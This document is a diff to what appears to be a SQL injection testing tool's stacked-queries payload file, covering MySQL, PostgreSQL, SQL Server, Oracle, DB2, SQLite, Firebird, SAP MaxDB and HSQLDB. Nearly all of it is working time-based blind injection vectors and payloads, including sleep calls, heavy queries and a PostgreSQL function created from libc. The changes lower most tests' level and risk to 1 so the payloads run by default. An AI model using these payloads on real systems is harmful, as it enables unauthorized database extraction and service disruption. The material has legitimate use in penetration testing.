@@ -5,10 +5,10 @@
     <test>
         <title>MySQL &gt;= 5.0.12 stacked queries (comment)</title>
         <stype>4</stype>
-        <level>2</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
         <request>
             <payload>;SELECT SLEEP([SLEEPTIME])</payload>
@@ -26,10 +26,10 @@
     <test>
         <title>MySQL &gt;= 5.0.12 stacked queries</title>
         <stype>4</stype>
-        <level>3</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
         <request>
             <payload>;SELECT SLEEP([SLEEPTIME])</payload>
@@ -46,10 +46,10 @@
      <test>
         <title>MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)</title>
         <stype>4</stype>
-        <level>3</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
         <request>
             <payload>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
@@ -67,10 +67,10 @@
     <test>
         <title>MySQL &gt;= 5.0.12 stacked queries (query SLEEP)</title>
         <stype>4</stype>
-        <level>4</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
         <request>
             <payload>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
@@ -87,10 +87,10 @@
     <test>
         <title>MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)</title>
         <stype>4</stype>
-        <level>3</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])</vector>
         <request>
             <payload>;SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))</payload>
@@ -107,10 +107,10 @@
     <test>
         <title>MySQL &lt; 5.0.12 stacked queries (BENCHMARK)</title>
         <stype>4</stype>
-        <level>5</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])</vector>
         <request>
             <payload>;SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))</payload>
@@ -129,7 +129,7 @@
         <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
         <request>
             <payload>;SELECT PG_SLEEP([SLEEPTIME])</payload>
@@ -147,10 +147,10 @@
     <test>
         <title>PostgreSQL &gt; 8.1 stacked queries</title>
         <stype>4</stype>
-        <level>4</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
         <request>
             <payload>;SELECT PG_SLEEP([SLEEPTIME])</payload>
@@ -167,10 +167,10 @@
     <test>
         <title>PostgreSQL stacked queries (heavy query - comment)</title>
         <stype>4</stype>
-        <level>2</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
         <request>
             <payload>;SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)</payload>
@@ -187,10 +187,10 @@
     <test>
         <title>PostgreSQL stacked queries (heavy query)</title>
         <stype>4</stype>
-        <level>5</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)</vector>
         <request>
             <payload>;SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)</payload>
@@ -206,10 +206,10 @@
     <test>
         <title>PostgreSQL &lt; 8.2 stacked queries (Glibc - comment)</title>
         <stype>4</stype>
-        <level>3</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
         <request>
             <payload>;CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])</payload>
@@ -228,10 +228,10 @@
     <test>
         <title>PostgreSQL &lt; 8.2 stacked queries (Glibc)</title>
         <stype>4</stype>
-        <level>5</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
         <request>
             <payload>;CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])</payload>
@@ -252,7 +252,7 @@
         <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'</vector>
         <request>
             <payload>;WAITFOR DELAY '0:0:[SLEEPTIME]'</payload>
@@ -270,10 +270,10 @@
     <test>
         <title>Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)</title>
         <stype>4</stype>
-        <level>2</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;DECLARE @x CHAR(9);SET @x=0x303a303a3[SLEEPTIME];IF([INFERENCE]) WAITFOR DELAY @x</vector>
         <request>
             <payload>;DECLARE @x CHAR(9);SET @x=0x303a303a3[SLEEPTIME];WAITFOR DELAY @x</payload>
@@ -291,10 +291,10 @@
     <test>
         <title>Microsoft SQL Server/Sybase stacked queries</title>
         <stype>4</stype>
-        <level>4</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'</vector>
         <request>
             <payload>;WAITFOR DELAY '0:0:[SLEEPTIME]'</payload>
@@ -311,10 +311,10 @@
     <test>
         <title>Microsoft SQL Server/Sybase stacked queries (DECLARE)</title>
         <stype>4</stype>
-        <level>5</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;DECLARE @x CHAR(9);SET @x=0x303a303a3[SLEEPTIME];IF([INFERENCE]) WAITFOR DELAY @x</vector>
         <request>
             <payload>;DECLARE @x CHAR(9);SET @x=0x303a303a3[SLEEPTIME];WAITFOR DELAY @x</payload>
@@ -334,7 +334,7 @@
         <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END FROM DUAL</vector>
         <request>
             <payload>;SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL</payload>
@@ -351,10 +351,10 @@
     <test>
         <title>Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)</title>
         <stype>4</stype>
-        <level>4</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END FROM DUAL</vector>
         <request>
             <payload>;SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL</payload>
@@ -370,10 +370,10 @@
     <test>
         <title>Oracle stacked queries (heavy query - comment)</title>
         <stype>4</stype>
-        <level>2</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END FROM DUAL</vector>
         <request>
             <payload>;SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5</payload>
@@ -390,10 +390,10 @@
     <test>
         <title>Oracle stacked queries (heavy query)</title>
         <stype>4</stype>
-        <level>5</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END FROM DUAL</vector>
         <request>
             <payload>;SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5</payload>
@@ -409,10 +409,10 @@
     <test>
         <title>Oracle stacked queries (DBMS_LOCK.SLEEP - comment)</title>
         <stype>4</stype>
-        <level>4</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END</vector>
         <request>
             <payload>;BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END</payload>
@@ -429,10 +429,10 @@
     <test>
         <title>Oracle stacked queries (DBMS_LOCK.SLEEP)</title>
         <stype>4</stype>
-        <level>5</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END</vector>
         <request>
             <payload>;BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END</payload>
@@ -448,10 +448,10 @@
     <test>
         <title>Oracle stacked queries (USER_LOCK.SLEEP - comment)</title>
         <stype>4</stype>
-        <level>5</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END</vector>
         <request>
             <payload>;BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END</payload>
@@ -468,10 +468,10 @@
     <test>
         <title>Oracle stacked queries (USER_LOCK.SLEEP)</title>
         <stype>4</stype>
-        <level>5</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END</vector>
         <request>
             <payload>;BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END</payload>
@@ -487,10 +487,10 @@
     <test>
         <title>IBM DB2 stacked queries (heavy query - comment)</title>
         <stype>4</stype>
-        <level>3</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE])</vector>
         <request>
             <payload>;SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3</payload>
@@ -507,10 +507,10 @@
     <test>
         <title>IBM DB2 stacked queries (heavy query)</title>
         <stype>4</stype>
-        <level>5</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE])</vector>
         <request>
             <payload>;SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3</payload>
@@ -526,10 +526,10 @@
     <test>
         <title>SQLite &gt; 2.0 stacked queries (heavy query - comment)</title>
         <stype>4</stype>
-        <level>3</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)</vector>
         <request>
             <payload>;SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</payload>
@@ -547,10 +547,10 @@
     <test>
         <title>SQLite &gt; 2.0 stacked queries (heavy query)</title>
         <stype>4</stype>
-        <level>5</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)</vector>
         <request>
             <payload>;SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))</payload>
@@ -567,10 +567,10 @@
     <test>
         <title>Firebird stacked queries (heavy query - comment)</title>
         <stype>4</stype>
-        <level>4</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM]) FROM RDB$DATABASE</vector>
         <request>
             <payload>;SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4</payload>
@@ -588,10 +588,10 @@
     <test>
         <title>Firebird stacked queries (heavy query)</title>
         <stype>4</stype>
-        <level>5</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM]) FROM RDB$DATABASE</vector>
         <request>
             <payload>;SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4</payload>
@@ -608,10 +608,10 @@
     <test>
         <title>SAP MaxDB stacked queries (heavy query - comment)</title>
         <stype>4</stype>
-        <level>4</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3</vector>
         <request>
             <payload>;SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3</payload>
@@ -628,10 +628,10 @@
     <test>
         <title>SAP MaxDB stacked queries (heavy query)</title>
         <stype>4</stype>
-        <level>5</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3</vector>
         <request>
             <payload>;SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3</payload>
@@ -647,10 +647,10 @@
     <test>
         <title>HSQLDB &gt;= 1.7.2 stacked queries (heavy query - comment)</title>
         <stype>4</stype>
-        <level>4</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) END</vector>
         <request>
             <payload>;CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)</payload>
@@ -668,10 +668,10 @@
     <test>
         <title>HSQLDB &gt;= 1.7.2 stacked queries (heavy query)</title>
         <stype>4</stype>
-        <level>5</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) END</vector>
         <request>
             <payload>;CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)</payload>
@@ -688,10 +688,10 @@
     <test>
         <title>HSQLDB &gt;= 2.0 stacked queries (heavy query - comment)</title>
         <stype>4</stype>
-        <level>4</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) END</vector>
         <request>
             <payload>;CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
@@ -709,10 +709,10 @@
     <test>
         <title>HSQLDB &gt;= 2.0 stacked queries (heavy query)</title>
         <stype>4</stype>
-        <level>5</level>
-        <risk>2</risk>
+        <level>1</level>
+        <risk>1</risk>
         <clause>1-8</clause>
-        <where>1</where>
+        <where>1,3</where>
         <vector>;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) END</vector>
         <request>
             <payload>;CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
